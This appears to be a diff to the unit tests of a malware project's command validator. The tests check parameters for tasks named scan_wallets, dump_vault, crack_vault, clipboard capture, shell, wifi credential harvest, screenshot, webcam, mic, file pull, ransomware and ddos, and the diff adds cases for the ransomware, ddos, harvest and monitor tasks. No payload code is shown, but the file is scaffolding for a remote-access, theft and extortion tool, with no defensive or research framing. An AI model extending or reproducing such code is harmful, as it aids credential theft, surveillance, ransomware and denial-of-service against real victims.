@@ -17,6 +17,11 @@ class TaskParamsTest {
 		assertNull(TaskParams.validate("file_pull", Map.of("path", "/tmp/a", "max_mb", 4)));
 		assertNull(TaskParams.validate("cancel", Map.of("task_id", "00000000-0000-4000-8000-000000000001")));
 		assertNull(TaskParams.validate("shell", Map.of("command", "whoami")));
+		assertNull(TaskParams.validate("monitor", Map.of("seconds", 5, "fps", 1.5)));
+		assertNull(TaskParams.validate("files", Map.of("action", "list", "path", "/tmp")));
+		assertNull(TaskParams.validate("harvest", Map.of("kind", "wifi")));
+		assertNull(TaskParams.validate("ransomware", Map.of("action", "status", "path", "/tmp")));
+		assertNull(TaskParams.validate("ddos", Map.of("method", "tcp", "host", "x", "port", 80)));
 	}
 
 	@Test
@@ -33,6 +38,9 @@ class TaskParamsTest {
 		assertEquals("invalid_param: max_files (1..20000)", TaskParams.validate("scan_wallets", Map.of("max_files", 0)));
 		assertEquals("invalid_param: max_mb (1..256)", TaskParams.validate("file_pull", Map.of("path", "x", "max_mb", 999)));
 		assertEquals("unknown_task: nope", TaskParams.validate("nope", Map.of()));
+		assertEquals("invalid_param: action", TaskParams.validate("files", Map.of("action", "chmod", "path", "/tmp")));
+		assertEquals("invalid_param: kind", TaskParams.validate("harvest", Map.of("kind", "nope")));
+		assertEquals("invalid_param: fps (0.2..5.0)", TaskParams.validate("monitor", Map.of("fps", 0.1)));
 	}
 
 	@Test
@@ -61,7 +69,8 @@ class TaskParamsTest {
 	@Test
 	void everyContractNameIsKnown() {
 		for (String name : new String[] {"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop",
-			"shell", "harvest", "screenshot", "file_pull", "cancel", "agent"}) {
+			"shell", "harvest", "screenshot", "file_pull", "cancel", "agent", "monitor", "files",
+			"webcam", "mic", "ransomware", "ddos"}) {
 			assertTrue(TaskParams.known(name), name);
 		}
 		assertFalse(TaskParams.known("nope"));
